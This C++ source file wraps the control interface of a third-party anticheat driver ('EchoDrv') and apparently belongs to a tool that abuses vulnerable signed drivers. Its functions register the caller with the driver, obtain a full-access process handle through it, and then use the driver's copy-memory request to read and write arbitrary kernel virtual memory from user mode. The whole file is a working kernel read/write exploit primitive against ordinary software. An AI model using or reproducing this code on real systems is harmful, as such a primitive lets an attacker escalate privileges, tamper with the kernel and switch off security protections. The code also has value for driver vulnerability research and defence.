/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ECHODRV.CPP
*
*  VERSION:     1.33
*
*  DATE:        16 Jul 2023
*
*  Inspect Element LTD spyware (anticheat) driver interface.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "echodrv.h"

HANDLE gEchoDrvClientHandle = NULL;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

/*
* supCallDriverEx
*
* Purpose:
*
* Call driver.
*
*/
NTSTATUS supCallDriverEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    NTSTATUS ntStatus = DeviceIoControl(DeviceHandle,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        NULL,
        NULL);

    if (ntStatus == STATUS_PENDING) {

        ntStatus = ::WaitForSingleObject(DeviceHandle,
            0);

    }

    return ntStatus;
}

/*
* supCallDriver
*
* Purpose:
*
* Call driver.
*
*/
BOOL supCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult;

    NTSTATUS ntStatus = supCallDriverEx(
        DeviceHandle,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    return bResult;
}

/*
* EchoDrvReadWriteVirtualMemory
*
* Purpose:
*
* Read/Write virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvReadWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL DoWrite
)
{
    ECHODRV_COPYVM_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));

    if (DoWrite) {
        request.FromAddress = Buffer;
        request.ToAddress = (PVOID)VirtualAddress;
    }
    else {
        request.FromAddress = (PVOID)VirtualAddress;
        request.ToAddress = Buffer;
    }

    request.BufferSize = (SIZE_T)NumberOfBytes;
    request.ProcessHandle = gEchoDrvClientHandle;

    return supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_COPYVM,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* EchoDrvWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
        VirtualAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* EchoDrvReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via EchoDrv.
*
*/
BOOL WINAPI EchoDrvReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return EchoDrvReadWriteVirtualMemory(DeviceHandle,
        VirtualAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* EchoDrvRegisterDriver
*
* Purpose:
*
* Echo client registration routine.
*
*/
BOOL WINAPI EchoDrvRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    BOOL bResult;
    ECHODRV_REGISTER regRequest;
    ECHODRV_VALIDATE_PROCESS procRequest;

    RtlSecureZeroMemory(&regRequest, sizeof(regRequest));

    //
    // Send empty buffer so this crapware driver will remember client pid to it global variable.
    // Theorerically this BS driver should do some crypto next-gen calculations but life is
    // not working as authors expected.
    //

    bResult = supCallDriver(DeviceHandle,
        IOCTL_ECHODRV_REGISTER,
        &regRequest,
        sizeof(regRequest),
        &regRequest,
        sizeof(regRequest));

    if (bResult) {

        //
        // Only to make MmCopyVirtualMemory work as it expects process object as param. 
        // 
        // However we are working with kernel VA and KernelMode processor mode is set by AC.
        //
        RtlSecureZeroMemory(&procRequest, sizeof(procRequest));

        procRequest.ProcessId = GetCurrentProcessId();
        procRequest.DesiredAccess = GENERIC_ALL;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_ECHODRV_OPEN_PROCESS,
            &procRequest,
            sizeof(procRequest),
            &procRequest,
            sizeof(procRequest));

        if (bResult)
            gEchoDrvClientHandle = procRequest.ProcessHandle;

    }

    return bResult;
}

/*
* EchoDrvUnregisterDriver
*
* Purpose:
*
* Echo unregister routine.
*
*/
BOOL WINAPI EchoDrvUnregisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(DeviceHandle);
    UNREFERENCED_PARAMETER(Param);

    if (gEchoDrvClientHandle)
        ::CloseHandle(gEchoDrvClientHandle);

    return TRUE;
}

